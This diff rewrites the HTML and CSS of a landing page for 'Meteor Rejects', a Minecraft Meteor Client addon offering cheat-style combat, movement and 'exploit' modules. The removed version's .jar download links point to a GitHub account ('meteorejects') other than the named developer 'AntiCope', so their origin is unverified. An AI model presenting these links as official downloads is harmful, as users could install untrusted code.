+.reveal-left{opacity:0;transform:translateX(-30px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.reveal-left.in{opacity:1;transform:none}
+
+.reveal-right{opacity:0;transform:translateX(30px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.reveal-right.in{opacity:1;transform:none}
+
+.divider{
+  border:none;
+  height:1px;
+  background:linear-gradient(to right,transparent,var(--line2),transparent);
+  margin:0;
+}
+
+#about{padding:6rem 0}
+.about-grid{
+  display:grid;grid-template-columns:repeat(2,1fr);gap:1.2rem;
+  margin-top:2rem;
+}
+@media(max-width:680px){.about-grid{grid-template-columns:1fr}}
+
+.about-card{
+  background:var(--glass);
+  border:1px solid var(--line);
+  border-radius:var(--radius2);
+  padding:2rem 1.8rem;
+  position:relative;overflow:hidden;
+  transition:border-color .3s,transform .3s var(--ease);
+}
+.about-card::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(circle at top left,rgba(192,25,46,.07),transparent 60%);
+  opacity:0;transition:opacity .3s;
+}
+.about-card:hover{border-color:var(--line2);transform:translateY(-5px)}
+.about-card:hover::before{opacity:1}
+.about-card-icon{
+  width:44px;height:44px;border-radius:12px;
+  background:rgba(192,25,46,.15);border:1px solid rgba(192,25,46,.3);
+  display:grid;place-items:center;
+  color:var(--r2);font-size:1rem;margin-bottom:1.2rem;
+  transition:background .2s,box-shadow .2s;
+}
+.about-card:hover .about-card-icon{background:rgba(192,25,46,.25);box-shadow:0 0 18px rgba(192,25,46,.3)}
+.about-card h3{font-weight:700;font-size:1rem;margin-bottom:.5rem;color:var(--text)}
+.about-card p{font-size:.88rem;color:var(--sub);line-height:1.7}
+
+#modules{padding:6rem 0}
+
+.control-bar{
+  display:flex;flex-wrap:wrap;gap:.9rem;margin-bottom:2.2rem;align-items:center;
+}
+.search-wrap{flex:1;min-width:220px;position:relative}
+.search-wrap i{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:var(--dim);font-size:.85rem;pointer-events:none}
+.search-wrap input{
+  width:100%;padding:.78rem 1.1rem .78rem 2.9rem;
+  border-radius:999px;
+  border:1px solid var(--line);
+  background:rgba(12,4,22,.8);
+  color:var(--text);
+  font-family:'Outfit',sans-serif;font-size:.88rem;
+  transition:border-color .2s,box-shadow .2s;
+  backdrop-filter:blur(8px);
+}
+.search-wrap input::placeholder{color:var(--dim)}
+.search-wrap input:focus{outline:none;border-color:var(--r);box-shadow:0 0 0 3px rgba(192,25,46,.2)}
+
+.pills{display:flex;flex-wrap:wrap;gap:.5rem}
+.pill{
+  font-size:.75rem;font-weight:600;letter-spacing:.3px;
+  padding:.4rem 1.1rem;border-radius:999px;cursor:pointer;
+  border:1px solid var(--line);color:var(--dim);background:transparent;
+  font-family:'Outfit',sans-serif;
+  transition:all .15s;
+}
+.pill:hover{color:var(--text);border-color:var(--line2)}
+.pill.on{background:var(--r);border-color:var(--r);color:#fff;box-shadow:0 4px 16px rgba(192,25,46,.4)}
+
+.mods-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));
+  gap:1rem;
+}
+.mod-card{
+  background:var(--glass);
+  border:1px solid var(--line);
+  border-radius:var(--radius);
+  padding:1.3rem 1.4rem;
+  transition:border-color .25s,transform .25s var(--ease),box-shadow .25s;
+  position:relative;overflow:hidden;cursor:default;
+  animation:popIn .35s var(--ease) both;
+}
+@keyframes popIn{from{opacity:0;transform:scale(.95) translateY(10px)}to{opacity:1;transform:none}}
+.mod-card::after{
+  content:'';position:absolute;
+  top:0;left:0;right:0;height:2px;
+  background:var(--grad);
+  transform:scaleX(0);transform-origin:left;
+  transition:transform .3s var(--ease);
+}
+.mod-card:hover{border-color:var(--line2);transform:translateY(-4px);box-shadow:0 12px 32px rgba(0,0,0,.45),0 0 0 1px var(--line2)}
+.mod-card:hover::after{transform:scaleX(1)}
+
+.mod-name{font-weight:700;font-size:.97rem;color:var(--text);margin-bottom:.45rem}
+.mod-desc{font-size:.82rem;color:var(--sub);line-height:1.55;margin-bottom:.8rem}
+.mod-tags{display:flex;flex-wrap:wrap;gap:.3rem}
+.tag{
+  font-size:.65rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;
+  padding:.18rem .65rem;border-radius:999px;
+}
+.t-default{background:rgba(192,25,46,.12);color:var(--r3);border:1px solid rgba(192,25,46,.22)}
+.t-port{background:rgba(50,120,255,.1);color:#7eb8ff;border:1px solid rgba(50,120,255,.2)}
+.t-removed{background:rgba(255,160,40,.1);color:#ffc570;border:1px solid rgba(255,160,40,.2)}
+.t-pr{background:rgba(60,200,100,.1);color:#70e090;border:1px solid rgba(60,200,100,.2)}
+.t-exploit{background:rgba(190,60,210,.1);color:#d890f0;border:1px solid rgba(190,60,210,.2)}
+
+#noMods{display:none;text-align:center;padding:4rem;color:var(--dim);font-size:.95rem}
+
+#commands{padding:6rem 0}
+.cmds-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:.7rem}
+.cmd-card{
+  background:var(--glass);
+  border:1px solid var(--line);
+  border-radius:var(--radius);
+  padding:.9rem 1.2rem;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;
+  transition:border-color .2s,transform .2s,background .2s;
+}
+.cmd-card:hover{border-color:var(--line2);background:rgba(192,25,46,.06);transform:translateX(5px)}
+.cmd-left{min-width:0}
+.cmd-name{font-family:'Outfit',monospace;font-weight:700;font-size:.88rem;color:var(--r3);letter-spacing:.3px}
+.cmd-desc{font-size:.75rem;color:var(--dim);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.copy-btn{
+  flex-shrink:0;background:none;border:none;cursor:pointer;
+  width:30px;height:30px;border-radius:8px;
+  color:var(--dim);font-size:.8rem;
+  display:grid;place-items:center;
+  transition:color .15s,background .15s;
+}
+.copy-btn:hover{color:var(--text);background:rgba(255,255,255,.08)}
+
+#install{padding:6rem 0}
+.install-grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem;margin-top:2rem}
+@media(max-width:720px){.install-grid{grid-template-columns:1fr}}
+
+.install-card{
+  background:var(--glass);border:1px solid var(--line);
+  border-radius:var(--radius2);padding:2rem 2rem;
+}
+.install-card h3{font-weight:700;font-size:1rem;margin-bottom:1.5rem;color:var(--text)}
+
+.step{display:flex;gap:1rem;margin-bottom:1.4rem;align-items:flex-start}
+.step:last-child{margin-bottom:0}
+.step-n{
+  flex-shrink:0;width:30px;height:30px;border-radius:50%;
+  background:var(--grad);
+  display:grid;place-items:center;
+  font-size:.78rem;font-weight:800;color:#fff;
+  box-shadow:0 4px 12px rgba(192,25,46,.45);
+}
+.step-body{font-size:.88rem;color:var(--sub);line-height:1.6}
+.step-body strong{color:var(--text)}
+code{background:rgba(192,25,46,.15);color:var(--r3);padding:1px 6px;border-radius:5px;font-size:.83em;font-family:monospace}
+
+.req-list{display:flex;flex-direction:column;gap:.8rem;margin-top:1rem}
+.req-item{display:flex;align-items:center;gap:.75rem;font-size:.88rem;color:var(--sub)}
+.req-item i{color:var(--r2);font-size:.8rem;flex-shrink:0}
+
+#download{padding:6rem 0}
+
+.dl-hero{
+  background:var(--glass2);
+  border:1px solid var(--line2);
+  border-radius:var(--radius3);
+  padding:3.5rem 3rem;
+  text-align:center;
+  position:relative;overflow:hidden;
+}
+.dl-hero::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(192,25,46,.12),transparent 60%);
+  pointer-events:none;
+}
+.dl-hero-title{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:clamp(2rem,5vw,3rem);letter-spacing:2px;
+  margin-bottom:.5rem;
+  background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.dl-hero-sub{color:var(--sub);font-size:.95rem;margin-bottom:2.2rem}
+
+.version-label{
+  font-size:.7rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;
+  color:var(--dim);margin-bottom:.6rem;
+}
+
+.custom-select-wrapper{
+  position:relative;
+  width:100%;max-width:300px;
+  display:inline-block;
+  margin-bottom:.5rem;
+}
+.custom-select-trigger{
+  width:100%;
+  padding:.9rem 3rem .9rem 1.3rem;
+  background:rgba(12,4,22,.9);
+  border:1px solid var(--line2);
+  border-radius:var(--radius);
+  color:var(--text);
+  font-family:'Outfit',sans-serif;font-size:.95rem;font-weight:600;
+  cursor:pointer;
+  display:flex;align-items:center;gap:.6rem;
+  transition:border-color .2s,box-shadow .2s;
+  user-select:none;
+  position:relative;
+  backdrop-filter:blur(8px);
+}
+.custom-select-trigger:hover,
+.custom-select-wrapper.open .custom-select-trigger{
+  border-color:var(--r2);
+  box-shadow:0 0 20px rgba(192,25,46,.3);
+}
+.custom-select-trigger::after{
+  content:'';position:absolute;right:16px;top:50%;
+  transform:translateY(-50%) rotate(0deg);
+  width:0;height:0;
+  border-left:5px solid transparent;
+  border-right:5px solid transparent;
+  border-top:6px solid var(--dim);
+  transition:transform .25s var(--ease);
+}
+.custom-select-wrapper.open .custom-select-trigger::after{
+  transform:translateY(-50%) rotate(180deg);
+}
+.trigger-icon{
+  width:28px;height:28px;border-radius:8px;
+  background:rgba(192,25,46,.15);border:1px solid rgba(192,25,46,.25);
+  display:grid;place-items:center;color:var(--r2);font-size:.75rem;flex-shrink:0;
+}
+.trigger-label{flex:1;text-align:left}
+
+.custom-select-dropdown{
+  position:absolute;top:calc(100% + 8px);left:0;right:0;
+  background:rgba(16,6,28,.98);
+  border:1px solid var(--line2);
+  border-radius:var(--radius);
+  z-index:200;
+  max-height:240px;overflow-y:auto;
+  display:none;
+  box-shadow:0 20px 50px rgba(0,0,0,.7);
+  backdrop-filter:blur(20px);
+  padding:.3rem;
+}
+.custom-select-wrapper.open .custom-select-dropdown{display:block}
+
+.custom-select-option{
+  padding:.8rem 1rem;border-radius:12px;
+  cursor:pointer;
+  font-size:.88rem;font-weight:500;color:var(--sub);
+  display:flex;align-items:center;gap:.7rem;
+  transition:background .15s,color .15s;
+}
+.custom-select-option:hover{
+  background:rgba(192,25,46,.12);
+  color:var(--text);
+}
+.custom-select-option.selected{
+  background:rgba(192,25,46,.15);
+  color:var(--r3);
+}
+.option-icon{
+  width:28px;height:28px;border-radius:7px;
+  background:rgba(192,25,46,.1);border:1px solid rgba(192,25,46,.2);
+  display:grid;place-items:center;color:var(--r2);font-size:.7rem;flex-shrink:0;
+}
+.option-badge{
+  margin-left:auto;font-size:.6rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;
+  background:var(--grad);color:#fff;
+  padding:.18rem .5rem;border-radius:999px;
+}
+.option-badge-stable{
+  background:rgba(255,255,255,.08);color:var(--sub);
+}
+
+.dl-btn-wrap{
+  display:flex;flex-direction:column;align-items:center;gap:.6rem;
+  width:100%;max-width:300px;margin:0 auto;
+}
+#download-btn{
+  width:100%;display:inline-flex;align-items:center;justify-content:center;gap:10px;
+  background:var(--grad);color:#fff;
+  font-family:'Outfit',sans-serif;font-size:1rem;font-weight:700;
+  padding:1rem 2rem;border-radius:999px;border:none;cursor:pointer;
+  text-decoration:none;
+  box-shadow:0 8px 32px rgba(192,25,46,.5);
+  transition:transform .2s,box-shadow .2s,filter .2s;
+}
+#download-btn:hover{transform:translateY(-3px);box-shadow:0 14px 40px rgba(192,25,46,.7);filter:brightness(1.1)}
+#download-btn::after{
+  content:'';position:absolute;inset:-2px;border-radius:inherit;
+  background:linear-gradient(90deg,var(--r),#ff4444,var(--r));
+  background-size:200%;z-index:-1;opacity:0;
+  animation:shimmer 3s linear infinite;
+  transition:opacity .3s;
+}
+#download-btn.updated::after{opacity:1}
+@keyframes shimmer{from{background-position:0% 50%}to{background-position:200% 50%}}
+
+.download-version-display{
+  font-size:.75rem;color:var(--dim);
+}
+.download-version-display span{color:var(--r3);font-weight:600}
+
+.dl-note{
+  margin-top:1.5rem;font-size:.8rem;color:var(--dim);
+}
+.dl-note a{color:var(--r4);text-decoration:none}
+.dl-note a:hover{text-decoration:underline}
+
+#config{padding:6rem 0}
+.config-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:1rem;margin-top:2rem}
+.cfg-card{
+  background:var(--glass);border:1px solid var(--line);
+  border-radius:var(--radius);padding:1.4rem;
+  transition:border-color .2s,transform .2s;
+}
+.cfg-card:hover{border-color:var(--line2);transform:translateY(-4px)}
+.cfg-ico{color:var(--r2);font-size:1.1rem;margin-bottom:.8rem}
+.cfg-title{font-weight:700;font-size:.9rem;margin-bottom:.4rem;color:var(--text)}
+.cfg-desc{font-size:.8rem;color:var(--sub);line-height:1.55}
+
+#faq{padding:6rem 0}
+.faq-list{display:flex;flex-direction:column;gap:.7rem;margin-top:2rem}
+.faq-item{
+  background:var(--glass);border:1px solid var(--line);
+  border-radius:var(--radius);overflow:hidden;
+  transition:border-color .2s;
+}
+.faq-item:hover{border-color:var(--line2)}
+.faq-q{
+  width:100%;display:flex;justify-content:space-between;align-items:center;gap:1.5rem;
+  padding:1.1rem 1.4rem;cursor:pointer;
+  background:none;border:none;color:var(--text);
+  font-family:'Outfit',sans-serif;font-size:.92rem;font-weight:600;
+  text-align:left;
+}
+.faq-icon{
+  width:26px;height:26px;border-radius:50%;
+  background:rgba(192,25,46,.15);
+  display:grid;place-items:center;
+  color:var(--r2);font-size:.7rem;flex-shrink:0;
+  transition:background .2s,transform .3s var(--ease);
+}
+.faq-item.open .faq-icon{background:var(--r);transform:rotate(45deg)}
+.faq-body{
+  max-height:0;overflow:hidden;
+  transition:max-height .4s var(--ease);
+}
+.faq-item.open .faq-body{max-height:300px}
+.faq-body p{padding:0 1.4rem 1.2rem;font-size:.88rem;color:var(--sub);line-height:1.75}
+
+footer{
+  padding:3rem 0 2rem;
+  border-top:1px solid var(--line);
+  position:relative;z-index:2;
+}
+.foot-inner{display:flex;flex-wrap:wrap;gap:2rem;justify-content:space-between;align-items:flex-start}
+.foot-brand{max-width:260px}
+.foot-brand .logo{margin-bottom:.8rem}
+.foot-brand p{font-size:.82rem;color:var(--dim);line-height:1.65}
+
+.foot-nav-title{font-size:.7rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--dim);margin-bottom:.8rem}
+.foot-links{display:flex;flex-direction:column;gap:.45rem}
+.foot-link{font-size:.83rem;color:var(--sub);text-decoration:none;transition:color .15s}
+.foot-link:hover{color:var(--text)}
+
+.foot-bottom{
+  margin-top:2.5rem;padding-top:1.2rem;
+  border-top:1px solid var(--line);
+  display:flex;flex-wrap:wrap;gap:.5rem;justify-content:space-between;align-items:center;
+  font-size:.78rem;color:var(--dim);
+}
+.foot-bottom a{color:var(--r4);text-decoration:none}
+.foot-bottom a:hover{text-decoration:underline}
+
+#btt{
+  position:fixed;bottom:1.8rem;right:1.8rem;z-index:500;
+  width:44px;height:44px;border-radius:50%;
+  background:var(--r);color:#fff;border:none;cursor:pointer;
+  font-size:.88rem;
+  display:grid;place-items:center;
+  box-shadow:0 4px 20px rgba(192,25,46,.6);
+  opacity:0;transform:translateY(16px) scale(.8);
+  transition:opacity .3s,transform .3s var(--ease);
+  pointer-events:none;
+}
+#btt.show{opacity:1;transform:none;pointer-events:all}
+#btt:hover{background:var(--r2);transform:translateY(-3px) scale(1.05)}
+
+@keyframes riseUp{from{opacity:0;transform:translateY(26px)}to{opacity:1;transform:none}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+
+@media(max-width:760px){
+  .wrap{padding:0 20px}
+  .nav-links .nav-a{display:none}
+  section{padding:4rem 0}
+  .hero-stats{border-radius:var(--radius)}
+  .h-stat{padding:1.1rem 1rem}
+  .dl-hero{padding:2.5rem 1.5rem}
+  .foot-inner{flex-direction:column;gap:2rem}
+}
+@media(max-width:480px){
+  .hero-btns{flex-direction:column;align-items:center}
+  .btn-fire,.btn-outline{width:100%;max-width:280px;justify-content:center}
+  .h-stat-n{font-size:1.9rem}
+}
+
+::selection{background:rgba(192,25,46,.4);color:#fff}
+
+.toast{
+  position:fixed;bottom:5rem;left:50%;transform:translateX(-50%) translateY(20px);
+  background:rgba(20,8,36,.95);border:1px solid var(--line2);
+  color:var(--text);font-size:.83rem;padding:.6rem 1.4rem;
+  border-radius:999px;z-index:9998;
+  opacity:0;transition:opacity .25s,transform .25s var(--ease);
+  pointer-events:none;white-space:nowrap;
+  backdrop-filter:blur(16px);
+}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="container nav-container">
-            <a href="#home" class="logo">
-                <i class="fas fa-meteor"></i> meteor-rejects
-            </a>
-            <div class="nav-links">
-                <a href="#home" class="nav-link" data-target="home">Home</a>
-                <a href="#modules" class="nav-link" data-target="modules">Modules</a>
-                <a href="#commands" class="nav-link" data-target="commands">Commands</a>
-                <a href="#config" class="nav-link" data-target="config">Config</a>
-                <a href="#download" class="nav-link" data-target="download">Download</a>
-                <a href="https://github.com/AntiCope/meteor-rejects" target="_blank" class="nav-link"><i class="fab fa-github"></i> GitHub</a>
-                <button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i></button>
-            </div>
+
+<div id="cursor" aria-hidden="true"></div>
+<div class="orb orb-1" aria-hidden="true"></div>
+<div class="orb orb-2" aria-hidden="true"></div>
+<div class="orb orb-3" aria-hidden="true"></div>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<nav id="navbar" role="navigation" aria-label="Main navigation">
+  <div class="wrap nav-inner">
+    <a href="#hero" class="logo" aria-label="Meteor Rejects home">
+      <span class="logo-meteor" aria-hidden="true"><i class="fas fa-meteor"></i></span>
+      <span>METEOR REJECTS</span>
+    </a>
+    <div class="nav-links" role="list">
+      <a href="#about"    class="nav-a" role="listitem">About</a>
+      <a href="#modules"  class="nav-a" role="listitem">Modules</a>
+      <a href="#commands" class="nav-a" role="listitem">Commands</a>
+      <a href="#install"  class="nav-a" role="listitem">Install</a>
+      <a href="#faq"      class="nav-a" role="listitem">FAQ</a>
+      <a href="https://github.com/AntiCope/meteor-rejects" target="_blank" rel="noopener" class="nav-a" role="listitem" aria-label="GitHub">
+        <i class="fab fa-github" aria-hidden="true"></i>
+      </a>
+      <a href="#download" class="nav-dl" role="listitem">
+        <i class="fas fa-download" aria-hidden="true"></i> Download
+      </a>
+    </div>
+  </div>
+</nav>
+
+<section id="hero" aria-labelledby="hero-h1">
+  <canvas id="heroCanvas" aria-hidden="true"></canvas>
+  <div class="hero-bg-lines" aria-hidden="true"></div>
+
+  <div class="hero-inner">
+    <div class="badge" aria-label="Status">
+      <span class="badge-dot" aria-hidden="true"></span>
+      Free &amp; Open Source · MIT License
+    </div>
+
+    <h1 class="hero-h1" id="hero-h1">
+      <span class="line-1">METEOR</span>
+      <span class="line-2">REJECTS</span>
+    </h1>
+
+    <p class="hero-sub">
+      The #1 addon for <strong style="color:var(--text)">Meteor Client</strong> — resurrecting rejected pull requests,
+      removed features, and ports from your favourite clients.
+      Free forever. Actively maintained.
+    </p>
+
+    <div class="hero-btns">
+      <a href="#download" class="btn-fire" id="heroDlBtn">
+        <i class="fas fa-download" aria-hidden="true"></i> Download Free
+      </a>
+      <a href="https://github.com/AntiCope/meteor-rejects" target="_blank" rel="noopener" class="btn-outline">
+        <i class="fab fa-github" aria-hidden="true"></i> View Source
+      </a>
+    </div>
+
+    <div class="hero-stats" role="list" aria-label="Key numbers">
+      <div class="h-stat" role="listitem"><div class="h-stat-n" data-count="58">0</div><div class="h-stat-l">Modules</div></div>
+      <div class="h-stat" role="listitem"><div class="h-stat-n" data-count="14">0</div><div class="h-stat-l">Commands</div></div>
+      <div class="h-stat" role="listitem"><div class="h-stat-n" data-count="520">0</div><div class="h-stat-l">Commits</div></div>
+      <div class="h-stat" role="listitem"><div class="h-stat-n">FREE</div><div class="h-stat-l">Always</div></div>
+    </div>
+  </div>
+
+  <div class="scroll-hint" aria-hidden="true">
+    <div class="scroll-line"></div>
+    <span>scroll</span>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="about" aria-labelledby="about-h2">
+  <div class="wrap">
+    <div class="reveal">
+      <p class="sec-label"><i class="fas fa-info-circle" aria-hidden="true"></i> What it is</p>
+      <h2 class="sec-h2" id="about-h2">Everything Meteor Left Behind</h2>
+      <p class="sec-sub">Meteor Rejects collects features that got cut, rejected, or never officially shipped — and gives them a permanent home.</p>
+    </div>
+    <div class="about-grid">
+      <article class="about-card reveal delay-1">
+        <div class="about-card-icon"><i class="fas fa-undo" aria-hidden="true"></i></div>
+        <h3>Restored Modules</h3>
+        <p>Features once in Meteor Client but removed over time — AimAssist, InstaMine, AntiBot, and more — fully restored and kept up to date.</p>
+      </article>
+      <article class="about-card reveal delay-2">
+        <div class="about-card-icon"><i class="fas fa-code-branch" aria-hidden="true"></i></div>
+        <h3>Unmerged Pull Requests</h3>
+        <p>Community PRs that were never merged into the main Meteor repo — AutoPot, PacketFly, TreeAura, and dozens more — all live here.</p>
+      </article>
+      <article class="about-card reveal delay-3">
+        <div class="about-card-icon"><i class="fas fa-exchange-alt" aria-hidden="true"></i></div>
+        <h3>Client Ports</h3>
+        <p>Best-in-class features cleanly ported from Wurst, BleachHack, LiquidBounce, JexClient, and Cornos into Meteor's architecture.</p>
+      </article>
+      <article class="about-card reveal delay-4">
+        <div class="about-card-icon"><i class="fas fa-shield-alt" aria-hidden="true"></i></div>
+        <h3>Drop-In Compatible</h3>
+        <p>Works alongside any Meteor addon. Built-in duplicate name handling, HTTP allowlisting, and module hiding keep your setup clean.</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="modules" aria-labelledby="modules-h2">
+  <div class="wrap">
+    <div class="reveal">
+      <p class="sec-label"><i class="fas fa-cubes" aria-hidden="true"></i> Module library</p>
+      <h2 class="sec-h2" id="modules-h2">58+ Modules</h2>
+      <p class="sec-sub">Combat, movement, utility, exploit, and visual — search or filter by version to find exactly what you need.</p>
+    </div>
+
+    <div class="control-bar reveal">
+      <div class="search-wrap" role="search">
+        <i class="fas fa-search" aria-hidden="true"></i>
+        <input type="search" id="modQ" placeholder="Search modules, tags, descriptions…" aria-label="Search modules">
+      </div>
+      <div class="pills" id="pills" role="group" aria-label="Filter by Minecraft version"></div>
+    </div>
+
+    <div class="mods-grid" id="modsGrid" role="list" aria-live="polite" aria-label="Modules"></div>
+    <p id="noMods" role="status">No modules match — try different keywords or clear the version filter.</p>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="commands" aria-labelledby="cmds-h2">
+  <div class="wrap">
+    <div class="reveal">
+      <p class="sec-label"><i class="fas fa-terminal" aria-hidden="true"></i> In-game commands</p>
+      <h2 class="sec-h2" id="cmds-h2">14+ Commands</h2>
+      <p class="sec-sub">Quick chat commands for power users. Click to copy any command to your clipboard.</p>
+    </div>
+    <div class="cmds-grid reveal" id="cmdsGrid"></div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<section id="install" aria-labelledby="install-h2">
+  <div class="wrap">
+    <div class="reveal">
+      <p class="sec-label"><i class="fas fa-hammer" aria-hidden="true"></i> Getting started</p>
+      <h2 class="sec-h2" id="install-h2">Install in 60 Seconds</h2>
+      <p class="sec-sub">Four simple steps and you're running 58+ extra modules.</p>
+    </div>
+    <div class="install-grid">
+      <div class="install-card reveal-left">
+        <h3><i class="fas fa-list-ol" style="color:var(--r2);margin-right:8px" aria-hidden="true"></i> Steps</h3>
+        <div class="step">
+          <div class="step-n">1</div>
+          <div class="step-body"><strong>Install Meteor Client</strong><br>Get the latest dev build from <a href="https://meteorclient.com" target="_blank" rel="noopener" style="color:var(--r3)">meteorclient.com</a> for your version.</div>
         </div>
-    </nav>
-
-    <main>
-        <div class="container">
-            <section id="home">
-                <div class="hero">
-                    <div class="hero-glow"></div>
-                    <div class="hero-badge"><i class="fas fa-fire"></i> resurrecting the fallen · crimson edition</div>
-                    <h1>Meteor Rejects</h1>
-                    <p>An addon for Meteor Client that resurrects rejected, removed, or ported features. Because some ideas never die—they just get rejected.</p>
-                    <div class="btn-group">
-                        <a href="#download" class="btn" id="heroDownloadBtn"><i class="fas fa-download"></i> Download Latest</a>
-                        <a href="https://github.com/AntiCope/meteor-rejects" target="_blank" class="btn btn-outline"><i class="fab fa-github"></i> GitHub</a>
-                    </div>
-                </div>
-
-                <div class="stats-grid">
-                    <div class="stat-card"><div class="stat-number">58+</div><div class="stat-label">Modules</div></div>
-                    <div class="stat-card"><div class="stat-number">14+</div><div class="stat-label">Commands</div></div>
-                    <div class="stat-card"><div class="stat-number">520+</div><div class="stat-label">Commits</div></div>
-                    <div class="stat-card"><div class="stat-number">🔥 2026</div><div class="stat-label">Active</div></div>
-                </div>
-            </section>
-
-            <section id="modules">
-                <h2 style="margin-bottom: 0.5rem;"><i class="fas fa-cubes"></i> Modules Library</h2>
-                <div class="control-bar">
-                    <div class="search-box"><i class="fas fa-search"></i><input type="text" id="moduleSearch" placeholder="Search modules..."></div>
-                    <div class="version-filter" id="versionFilters"></div>
-                </div>
-                <div id="modulesGrid" class="modules-grid"></div>
-                <div id="noModulesMsg" style="display: none; text-align: center; padding: 3rem;">🔥 No modules match — try a different filter.</div>
-            </section>
-
-            <section id="commands">
-                <h2><i class="fas fa-terminal"></i> Commands</h2>
-                <div id="commandsList" class="commands-grid"></div>
-            </section>
-
-            <section id="config">
-                <h2><i class="fas fa-sliders-h"></i> Configuration Tweaks</h2>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(270px,1fr)); gap: 1.2rem; margin: 2rem 0;">
-                    <div class="stat-card" style="text-align: left;"><i class="fas fa-globe"></i> <strong>HTTP Allowed</strong><br><span style="font-size:0.8rem;">Restrict HTTP requests to trusted domains</span></div>
-                    <div class="stat-card" style="text-align: left;"><i class="fas fa-eye-slash"></i> <strong>Hidden Modules</strong><br><span style="font-size:0.8rem;">Hide modules from GUI (restart required)</span></div>
-                    <div class="stat-card" style="text-align: left;"><i class="fas fa-font"></i> <strong>Load System Fonts</strong><br><span style="font-size:0.8rem;">Disable for faster startup, use custom fonts</span></div>
-                    <div class="stat-card" style="text-align: left;"><i class="fas fa-copy"></i> <strong>Duplicate Module Names</strong><br><span style="font-size:0.8rem;">Allow overriding Meteor modules safely</span></div>
-                </div>
-            </section>
-
-            <section id="download">
-                <h2><i class="fas fa-download"></i> Downloads</h2>
-                <div class="download-card" style="background: var(--bg-card); border-radius: 36px; padding: 2rem; border: 1px solid var(--border); text-align: center;">
-                    <h3>Choose your Minecraft version</h3>
-                    <div class="version-downloads">
-                        <div class="version-card">
-                            <div class="version-number">1.21.0</div>
-                            <a href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/meteor-rejects-addon-1.21.0.jar" class="download-btn-small" download><i class="fas fa-download"></i> Download</a>
-                        </div>
-                        <div class="version-card">
-                            <div class="version-number">1.21.4</div>
-                            <a href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/meteor-rejects-addon-1.21.4.jar" class="download-btn-small" download><i class="fas fa-download"></i> Download</a>
-                        </div>
-                        <div class="version-card">
-                            <div class="version-number">1.21.11</div>
-                            <a href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/meteor-rejects-addon-1.21.11.jar" class="download-btn-small" download><i class="fas fa-download"></i> Download</a>
-                        </div>
-                    </div>
-                    <div class="install-box" style="text-align: left; max-width: 440px; margin: 2rem auto 0; background: var(--bg-darker); padding: 1.2rem 1.8rem; border-radius: 28px;">
-                        <strong><i class="fas fa-hammer"></i> Installation</strong>
-                        <ol style="margin-top: 8px; padding-left: 1.2rem;">
-                            <li>Install <strong>Meteor Client</strong> (dev build recommended)</li>
-                            <li>Drop the <code>.jar</code> into <code>.minecraft/mods</code></li>
-                            <li>Launch with Fabric Loader ≥0.15</li>
-                        </ol>
-                    </div>
-                </div>
-            </section>
+        <div class="step">
+          <div class="step-n">2</div>
+          <div class="step-body"><strong>Download Meteor Rejects</strong><br>Grab the <code>.jar</code> from the <a href="#download" style="color:var(--r3)">Download section</a> matching your Minecraft version.</div>
         </div>
-        <footer class="footer">
-            <div class="container">
-                <p>Meteor Rejects – an addon by <a href="https://github.com/AntiCope" style="color: var(--accent);">AntiCope</a> and contributors. MIT License.</p>
-                <p style="margin-top: 6px; font-size: 0.8rem;">Not an official Meteor Client project. Use responsibly.</p>
-            </div>
-        </footer>
-    </main>
-    <button class="back-to-top" id="backToTop"><i class="fas fa-arrow-up"></i></button>
+        <div class="step">
+          <div class="step-n">3</div>
+          <div class="step-body"><strong>Drop it in mods</strong><br>Place the <code>.jar</code> in <code>.minecraft/mods</code> alongside Meteor Client.</div>
+        </div>
+        <div class="step">
+          <div class="step-n">4</div>
+          <div class="step-body"><strong>Launch with Fabric</strong><br>Start Minecraft via <strong>Fabric Loader 0.15+</strong>. All modules appear in Meteor's GUI instantly.</div>
+        </div>
+      </div>
+      <div class="install-card reveal-right">
+        <h3><i class="fas fa-check-circle" style="color:var(--r2);margin-right:8px" aria-hidden="true"></i> Requirements</h3>
+        <div class="req-list">
+          <div class="req-item"><i class="fas fa-check" aria-hidden="true"></i><span>Minecraft <strong style="color:var(--text)">Java Edition</strong> — 1.21.0, 1.21.4, or 1.21.11</span></div>
+          <div class="req-item"><i class="fas fa-check" aria-hidden="true"></i><span>Fabric Loader <strong style="color:var(--text)">0.15 or newer</strong></span></div>
+          <div class="req-item"><i class="fas fa-check" aria-hidden="true"></i><span>Meteor Client <strong style="color:var(--text)">(dev build recommended)</strong></span></div>
+          <div class="req-item"><i class="fas fa-check" aria-hidden="true"></i><span>Java <strong style="color:var(--text)">17 or newer</strong></span></div>
+        </div>
